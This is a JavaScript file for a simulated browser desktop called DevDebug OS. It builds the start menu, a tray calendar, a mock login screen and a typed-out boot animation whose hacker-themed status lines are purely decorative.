    const profileBtn = document.getElementById('start-menu-profile-btn');

    // 1. Populate the app list in the start menu
    startMenuAppsList.innerHTML = ''; // Clear any placeholders
    for (const appId in apps) {
        const appConfig = apps[appId];
        const li = document.createElement('li');
        li.className = 'p-2 flex items-center space-x-3 rounded start-menu-item cursor-pointer';
        li.dataset.appId = appId;
        li.innerHTML = `
                  <i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>
                  <span>${appConfig.title}</span>
              `;
        startMenuAppsList.appendChild(li);
    }
    lucide.createIcons({ nodes: startMenuAppsList.querySelectorAll('[data-lucide]') });

    // 2. Add event listener to open apps from the menu
    startMenuAppsList.addEventListener('click', (e) => {
        const listItem = e.target.closest('li[data-app-id]');
        if (listItem) {
            openApp(listItem.dataset.appId);
            startMenu.classList.add('hidden'); // Close menu after opening
        }
    });

    // 3. Toggle menu visibility on start button click
    startBtn.addEventListener('click', (e) => {
        e.stopPropagation(); // Prevent document click listener from closing it immediately
        startMenu.classList.toggle('hidden');
    });

    // 4. Close menu when clicking outside
    document.addEventListener('click', (e) => {
        if (!startMenu.classList.contains('hidden') && !startMenu.contains(e.target) && !startBtn.contains(e.target)) {
            startMenu.classList.add('hidden');
        }
    });

    // 5. Footer button actions
    restartBtn.addEventListener('click', () => location.reload());
    shutdownBtn.addEventListener('click', () => document.body.innerHTML = '<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN...</div>');

    // 6. Profile button action
    profileBtn.addEventListener('click', () => {
        openApp('devdebug-profile');
        startMenu.classList.add('hidden'); // Close menu after opening
    });
}

/**
 * Initializes the Tray Calendar popup.
 */
function initCalendar() {
    const calendarPopup = document.getElementById('calendar-popup');
    const dateDisplayContainer = document.getElementById('system-tray').querySelector('.leading-tight');
    const monthYearEl = document.getElementById('calendar-month-year');
    const calendarBody = document.getElementById('calendar-body');
    const prevMonthBtn = document.getElementById('calendar-prev-month');
    const nextMonthBtn = document.getElementById('calendar-next-month');

    let currentDate = new Date();

    function renderCalendar(date) {
        calendarBody.innerHTML = '';
        const year = date.getFullYear();
        const month = date.getMonth();

        monthYearEl.textContent = `${date.toLocaleString('default', { month: 'long' })} ${year}`;

        // Day headers
        const days = ['Su', 'Mo', 'Tu', 'We', 'Th', 'Fr', 'Sa'];
        days.forEach(day => {
            const dayEl = document.createElement('div');
            dayEl.className = 'font-bold text-xs';
            dayEl.style.color = 'var(--text-color-dim)';
            dayEl.textContent = day;
            calendarBody.appendChild(dayEl);
        });

        const firstDayOfMonth = new Date(year, month, 1).getDay();
        const daysInMonth = new Date(year, month + 1, 0).getDate();

        // Blank days for padding
        for (let i = 0; i < firstDayOfMonth; i++) {
            calendarBody.appendChild(document.createElement('div'));
        }

        // Date cells
        for (let i = 1; i <= daysInMonth; i++) {
            const dayEl = document.createElement('div');
            dayEl.className = 'p-1 rounded-full calendar-day cursor-default';
            dayEl.textContent = i;
            if (i === new Date().getDate() && month === new Date().getMonth() && year === new Date().getFullYear()) {
                dayEl.classList.add('today');
            }
            calendarBody.appendChild(dayEl);
        }
    }

    dateDisplayContainer.addEventListener('click', (e) => {
        e.stopPropagation();
        calendarPopup.classList.toggle('hidden');
        if (!calendarPopup.classList.contains('hidden')) {
            renderCalendar(currentDate);
            lucide.createIcons({ nodes: calendarPopup.querySelectorAll('[data-lucide]') });
        }
    });

    document.addEventListener('click', (e) => {
        if (!calendarPopup.classList.contains('hidden') && !calendarPopup.contains(e.target) && !dateDisplayContainer.contains(e.target)) {
            calendarPopup.classList.add('hidden');
        }
    });

    prevMonthBtn.addEventListener('click', () => { currentDate.setMonth(currentDate.getMonth() - 1); renderCalendar(currentDate); });
    nextMonthBtn.addEventListener('click', () => { currentDate.setMonth(currentDate.getMonth() + 1); renderCalendar(currentDate); });
}

/**
 * Initializes the Authentication screen (Login screen).
 * Handles the transition from boot to desktop.
 */
function initAuthScreen() {
    const authScreen = document.getElementById('auth-screen');
    const authBtn = document.getElementById('auth-btn');
    const desktop = document.getElementById('desktop');
    const taskbar = document.getElementById('taskbar');
    const clickSound = document.getElementById('click-sound');
    const hoverSound = document.getElementById('hover-sound');

    // Add hover sound effect to the button
    if (hoverSound) {
        authBtn.addEventListener('mouseenter', () => {
            hoverSound.currentTime = 0;
            hoverSound.play().catch(e => { });
        });
    }

    authBtn.addEventListener('click', () => {
        // 1. Show loading state on the button
        if (clickSound) {
            clickSound.currentTime = 0;
            clickSound.play().catch(e => { });
        }

        authBtn.disabled = true;
        authBtn.innerHTML = `
                  <div class="flex items-center justify-center">
                      <span class="m-2">AUTHENTICATING</span>
                      <i data-lucide="loader-pinwheel" class="w-5 h-5 animate-spin mr-2"></i> 
                  </div>
              `;
        lucide.createIcons({ nodes: [authBtn.querySelector('i')] });

        // 2. Simulate a delay
        setTimeout(() => {
            // 3. Proceed with showing the desktop

            // Fade out the auth screen
            authScreen.style.transition = `opacity ${ANIMATION_CONSTANTS.FADE_DURATION}ms ease-out`;
            authScreen.style.opacity = '0';

            // Start the music now that the user has interacted
            const music = document.getElementById('background-music');
            if (music) {
                music.play().catch(e => {
                    console.error("Music autoplay failed:", e);
                });
            }

            // Show the desktop and taskbar
            desktop.classList.remove('hidden');
            taskbar.classList.remove('hidden');
            
            // Apply saved background or set default
            const savedBg = localStorage.getItem('desktopBackground');
            if (savedBg && savedBg !== 'none' && savedBg !== 'solid') {
                document.body.style.backgroundImage = `url('${import.meta.env.BASE_URL}assets/BG/${savedBg}')`;
                document.body.style.backgroundSize = 'cover';
                document.body.style.backgroundPosition = 'center';
                document.body.style.backgroundRepeat = 'no-repeat';
            } else if (savedBg === 'solid') {
                const savedBgColor = localStorage.getItem('desktopBackgroundColor');
                if (savedBgColor) {
                    document.body.style.backgroundColor = savedBgColor;
                    document.body.style.backgroundImage = 'none';
                }
            } else {
                // Set default background (City)
                document.body.style.backgroundImage = `url('${import.meta.env.BASE_URL}assets/BG/devdebugBG02.jpg')`;
                document.body.style.backgroundSize = 'cover';
                document.body.style.backgroundPosition = 'center';
                document.body.style.backgroundRepeat = 'no-repeat';
                localStorage.setItem('desktopBackground', 'devdebugBG02.jpg');
            }
            setTimeout(() => authScreen.remove(), ANIMATION_CONSTANTS.FADE_DURATION);
        }, ANIMATION_CONSTANTS.AUTH_DELAY);
    });
}

/**
 * Initializes the Boot Sequence (Terminal-style loading animation).
 */
function initBootSequence() {
    const bootScreen = document.getElementById('boot-screen');
    const bootLogoEl = document.getElementById('boot-logo');
    const bootTextEl = document.getElementById('boot-text');
    const bootProgressEl = document.getElementById('boot-progress');
    const bootPercentEl = document.getElementById('boot-percent');
    const bootStatusEl = document.getElementById('boot-status');
    const authScreen = document.getElementById('auth-screen');

    // 1. Set the ASCII Logo
    const logoArt = `

    
     ____          ____      _              _____ _____ 
    |    \\ ___ _ _|    \\ ___| |_ _ _ ___   |     |   __|
    |  |  | -_| | |  |  | -_| . | | | . |  |  |  |__   |
    |____/|___|\\_/|____/|___|___|___|_  |  |_____|_____|
                                    |___|               
    ________________________________________________________
    
    
    `;
    bootLogoEl.textContent = logoArt;

    // 2. Define the boot sequence lines
    const bootLines = [
        { text: 'Initializing DEVDEBUG Kernel v5.4.0...', delay: 20 },
        { text: 'Loading system core modules...', delay: 20 },
        { text: 'Mounting root file system (Read-Only)...[ OK ]', color: 'var(--primary-color)' },
        { text: 'Verifying integrity of system files...', delay: 40 },
        { text: ' [SUCCESS] Integrity check passed (Checksum: 0x8F3A2)', color: 'var(--primary-color)' },
        { text: 'Initializing hardware drivers:', delay: 10 },
        { text: '  > GPU: NVIDIA GeForce RTX Simulated Edition...[ OK ]', color: '#aaa' },
        { text: '  > CPU: Quantum Core x86_64 Emulator...[ OK ]', color: '#aaa' },
        { text: '  > RAM: 32768KB Allocated...[ OK ]', color: '#aaa' },
        { text: 'Detected input devices: [ Keyboard ], [ Mouse ], [ NeuralLink ]', delay: 30 },
        { text: 'Starting Network Manager...', delay: 50 },
        { text: '  > IP Address assigned: 192.168.0.105', color: '#aaa' },
        { text: '  > Gateway reachable.', color: '#aaa' },
        { text: 'Starting Window Manager environment...', delay: 40 },
        { text: 'Loading assets and configurations...', delay: 60 },
        { text: 'Security hardening in progress...', delay: 30 },
        { text: ' [WARN] Unofficial plugin detected in /usr/local/addons', color: 'var(--danger-color)' },
        { text: 'Bypassing security warnings...[ OVERRIDE ]', color: 'var(--accent-color)' },
        { text: 'Establishing secure tunnel to mainframe...', delay: 100 },
        { text: 'System services started.', delay: 20 },
        { text: 'Handing over control to user session...', delay: 500 },
        { text: 'Welcome to DevDebug OS', color: 'var(--accent-color)', delay: 100 }
    ];

    let lineIndex = 0;

    // 3. Progress Bar Simulation (runs somewhat independently but aligned with lines)
    let currentPercent = 0;
    const updateProgress = () => {
        // Calculate target percent based on how many lines we've processed
        const targetPercent = Math.min(100, Math.floor(((lineIndex + 1) / bootLines.length) * 100));

        // Move currentPercent towards targetPercent smoothly
        if (currentPercent < targetPercent) {
            currentPercent += Math.random() * 2 + 0.5;
            if (currentPercent > targetPercent) currentPercent = targetPercent;
        }

        // Update UI
        bootProgressEl.style.width = `${currentPercent}%`;
        bootPercentEl.textContent = `${Math.floor(currentPercent)}%`;

        if (currentPercent < 100) {
            requestAnimationFrame(updateProgress);
        }
    };
    requestAnimationFrame(updateProgress);

    // 4. Function to type out lines character by character
    function typeLine(lineData, onComplete) {
        const lineDiv = document.createElement('div');
        // lineDiv.className = 'whitespace-pre-wrap break-words font-mono text-sm leading-tight'; // Handled by parent container styles mostly
        lineDiv.style.opacity = '0.9';
        if (lineData.color) lineDiv.style.color = lineData.color;
        else lineDiv.style.color = 'var(--text-color-dim)'; // Default greenish

        bootTextEl.appendChild(lineDiv);

        // Auto-scroll logic: Keep the latest text in view
        // Since we are using flex-col-reverse or justify-end, this happens somewhat automatically for position, but we might need to ensure the container is scrolled to bottom if it was standard block.
        // Actually, with the new CSS (flex-col justify-end), new items appear at the bottom. 
        // We just need to make sure we don't overflow the top if we don't want to.

        const text = lineData.text;
        let charIndex = 0;

        // Typing speed: varying slightly creates realism
        const baseSpeed = 5;

        function typeChar() {
            if (charIndex < text.length) {
                lineDiv.textContent += text.charAt(charIndex);
                charIndex++;
                setTimeout(typeChar, baseSpeed + Math.random() * 5);
            } else {
                // Line finished
                setTimeout(onComplete, lineData.delay || 50);
            }
        }

        typeChar();
    }

    function processNextLine() {
        if (lineIndex < bootLines.length) {
            typeLine(bootLines[lineIndex], () => {
                lineIndex++;
                processNextLine();
            });
        } else {
            // Sequence Complete
            finishBoot();
        }
    }

    function finishBoot() {
        bootProgressEl.style.width = '100%';
        bootPercentEl.textContent = '100%';
        bootStatusEl.textContent = "SYSTEM READY";
        bootStatusEl.style.color = "var(--accent-color)";

        setTimeout(() => {
            // Fade out boot screen
            bootScreen.style.transition = `opacity ${ANIMATION_CONSTANTS.FADE_DURATION}ms ease-out, transform 0.5s ease-in`;
            bootScreen.style.opacity = '0';
            bootScreen.style.transform = 'scale(1.05)'; // Slight zoom out effect

            // Prepare Auth Screen
            authScreen.classList.remove('hidden');

            setTimeout(() => {
                authScreen.style.opacity = '1';
                bootScreen.remove();
                initAuthScreen();
            }, ANIMATION_CONSTANTS.FADE_DURATION);
        }, 800);
    }

    // Start the sequence
    processNextLine();
}


// KERNEL INITIALIZATION

/**
 * Main entry point. Executed when the document is fully loaded.
 */
window.onload = () => {
    window.osStartTime = new Date(); // Record the start time for uptime calculation
    initTime();

    // Render Lucide icons on the desktop
    lucide.createIcons();
    initContextMenu();
    initStartMenu();
    initCalendar();
    initMusic();
    initBootSequence(); // Start with the boot sequence
    // Icon Hover Sound
    const hoverSound = document.getElementById('hover-sound');
    if (hoverSound) {
        hoverSound.volume = UI_CONSTANTS.DEFAULT_SFX_VOLUME;
    }

    // Apply drag functionality and hover sound to all desktop icons
    const icons = document.querySelectorAll('.desktop-icon');
    icons.forEach(icon => {
        makeIconDraggable(icon);
        if (hoverSound) {
            icon.addEventListener('mouseenter', () => {
                hoverSound.currentTime = 0; // Rewind to start
                hoverSound.play().catch(e => { }); // Play and ignore errors if interaction not yet allowed
            });
        }
    });

    // Set up event listeners for desktop icons
    setupDesktopIcons();
};

// --- HACK: Global Overrides ---
// We wrap the core open/close functions to trigger UI updates (Taskbar) automatically.
const originalOpenApp = openApp;
openApp = (appId) => {
    originalOpenApp(appId);
    updateAppTray();
};

const originalCloseApp = closeApp;
closeApp = (appId) => {
    originalCloseApp(appId);
    updateAppTray();
};